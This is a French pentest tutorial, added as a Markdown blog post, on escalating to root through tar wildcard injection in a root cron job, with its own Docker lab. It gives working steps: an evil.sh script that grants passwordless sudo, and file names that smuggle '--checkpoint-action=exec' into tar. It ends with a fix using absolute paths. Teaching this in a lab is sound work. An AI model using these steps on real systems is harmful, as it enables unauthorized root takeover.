@@ -1,0 +1,172 @@
+---
+date: 22/01/2023
+title: 'Privilege Escalation : Linux Wildcard Injection.'
+description: 'Explication et exploitation de la vulnérabilité "Linux Wildcard Injection" à travers un cron jobs utilisant la commande tar. Le tout avec un lab docker dédié.'
+image: /posts/linux_wildcard_injection.png
+tags: linux pentest
+author: '@ley0x_'
+lang: fr
+---
+
+## 1. Introduction et lab
+
+Dans cet article, nous allons voir comment exploiter une vulnérabilité sous Linux qui peut vous permettre de passer administrateur sur une machine.
+Nous allons devoir comprendre le principe des **wildcard characters** et voir en quoi ils posent problème. Ensuite, nous allons pouvoir nous amuser et passer d'un simple utilisateur à root !
+Pour cela, j'ai créé un lab, qui n'est rien d'autre qu'une machine ubuntu sous docker.
+Cela va vous permettre de pratiquer tout au long de l'article.
+
+Pour installer le lab, il vous faut **docker** sur votre machine, cloner ce repository [GitHub](https://github.com/leoroullois/linux-wildcard-injection), puis suivre les [instructions d'installation](https://github.com/leoroullois/linux-wildcard-injection) (rapide).
+
+## 2. C'est quoi les « Wildcard character »
+
+Sous Linux, les **wildcard characters** sont un ou plusieurs caractères représentant d'autres caractères.
+Il en existe plusieurs, en voici deux principaux :
+Le wildcard **\*** peut être remplacé par n'importe quel caractère ou suite de caractères.
+Par exemple, `*.txt` va matcher `a.txt` et `file.txt` mais aussi `fichier_2.txt`.  
+Le wildcard **?** n'est remplacé que par un seul caractère.
+Par exemple, `?.pdf` va matcher `b.pdf` mais pas `file.pdf`.  
+Nous allons nous intéresser au caractère **\*** qui peut être exploité dans un contexte de **privilege escalation**.
+
+## 3. Comprendre le problème
+
+Pour comprendre le problème, on va utiliser un exemple simple avec la commande `ls`.
+Tous d'abord, déplacez-vous dans le dossier `/home/user/intro`, qui contient 2 fichiers.
+Listez les fichiers avec la commande `ls *`. Le caractère **\*** n'est pas utile, mais il va permettre d'illustrer le problème.
+Maintenant, créez un fichier se nommant `-la` grâce à la commande suivante :
+
+```shell
+echo "" > -la
+```
+
+Maintenant, refaites la commande `ls *`. L'output est différent ! Normalement, il doit ressembler à ceci :
+
+```
+user@ubuntu:~/intro$ ls *
+-rw-r--r-- 1 user user 0 Dec 30 10:07 file1.txt
+-rw-r--r-- 1 user user 0 Dec 30 10:07 file2.pdf
+```
+
+En faite notre dossier contient les fichiers : `-la`, `file1.txt` et `file2.pdf`. Ainsi, notre wildcard caractère a été remplacé par ces noms de fichiers, et donc la commande réellement exécutée est en faite :
+
+```shell
+ls -la file1.txt file2.pdf
+```
+
+Le point principal à comprendre par la suite, c'est que la commande `ls` ne va pas interpréter `-la` comme un fichier, mais bien comme étant des flags comme elle l'aurait fait normalement. Ceci explique donc l'output que l'on a eu précédemment.
+
+C'est ce principe que l'on va exploiter ensuite pour faire de l'escalade de privilège.
+
+<Info>
+Ce n'est pas réserver uniquement à la commande `ls` mais c'est valable pour toutes les commandes Linux.
+</Info>
+
+## 4. Tar Wildcard Injection
+
+### 4.1. La commande tar
+
+La commande **tar** sert à créer des archives. Cette commande possède plusieurs flags et ceux qui nous intéressent ici sont `--checkpoint` et `--checkpoint-action`.
+Voici un extrait du manuel de la commande TAR :
+
+```
+--checkpoint[=N]
+            Display progress messages every Nth record (default 10).
+--checkpoint-action=ACTION
+            Run ACTION on each checkpoint.
+```
+
+Définir `--checkpoint=1` va nous permettre d'exécuter un script malveillant à chaque exécution de la commande **tar**.
+
+Pour ce faire, on place le flag **checkpoint-action** comme ceci : `--checkpoint-action=exec=sh script_malveillant.sh`.
+
+### 4.2. C'est quoi les « Cron table » ?
+
+La **cron table** est un fichier qui défini des **cron jobs**. Les **cron jobs** sont des actions « programmées » qui s'exécutent automatiquement, par exemple toutes les heures, toutes les minutes, au démarrage de la machine (en fonction de la crontable)...
+Les **cron jobs** sont souvent exécutées en tant que root.
+
+C'est intéressant, car si dans le cadre d'un pentest web vous vous introduisez dans un serveur web qui possède une cron table vulnérable aux wildcard injections (classique dans les CTF tryhackme), vous pourrez devenir administrateur.
+
+Voici un exemple de fichier `/etc/crontab` vierge :
+
+```
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+```
+
+### 4.3. Exploitation de la vulnérabilité
+
+Faites un `cat /etc/crontab`, si vous voyez ce genre de ligne, c'est bon signe :
+
+```
+* * * * * root cd /home/user && tar -cf /opt/backup.tar *
+```
+
+Ça signifie que la commande **tar** va être lancée toutes les minutes en tant que root pour créer une archive (backup) du dossier home de notre utilisateur.
+
+Pour la suite de l'article, assurez-vous donc bien d'être dans le dossier `/home/user`.
+
+Commençons par créer notre script malveillant qui nous permettra de devenir root.
+
+La méthode la plus « direct » est d'ajouter l'utilisateur courant aux **sudoers**, mais vous pouvez vous amuser à exécuter un **reverse shell**.
+Vous pourriez aussi ajouter la permission **SUID** sur un exécutable, par exemple, dans le but d'utiliser un exploit trouvé sur [GTFOBins](https://gtfobins.github.io/).
+
+On va rester simple ici :
+
+```shell
+echo "echo 'user  ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" > evil.sh
+```
+
+Lorsque `evil.sh` sera exécuter par un utilisateur possédant les droits root, le contenu suivant va être ajouté dans le fichier `/etc/sudoers` :
+`user ALL=(ALL) NOPASSWD:ALL`
+
+<Info>
+Cela signifie que l'utilisateur **user** aura été ajouté aux **sudoers** et pourra exécuter des commandes en tant que root.
+</Info>
+
+Ensuite, créons un fichier de la sorte dans le dossier `/home/user` :
+
+```shell
+echo "" > --checkpoint=1
+```
+
+Puis, créons le fichier qui va permettre d'exécuter notre script malveillant :
+
+```shell
+echo "" > "--checkpoint-action=exec=sh evil.sh"
+```
+
+Maintenant, on attend une minute que le cron job s'exécute. Après cela, vous devriez pouvoir exécuter des commandes avec le mot clé `sudo` !
+
+```
+user@ubuntu:~$ sudo whoami
+root
+```
+
+```
+user@ubuntu:~$ sudo id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+C'est gagné !
+
+## 5. Comment éviter ce type d'attaques ?
+
+Pour éviter ce type de vulnérabilité, c'est très simple, il suffit d'ajouter le chemin absolu avant le **wildcard character**, par exemple ici :
+
+```shell
+tar cf /opt/backup.tar /home/user/*
+```
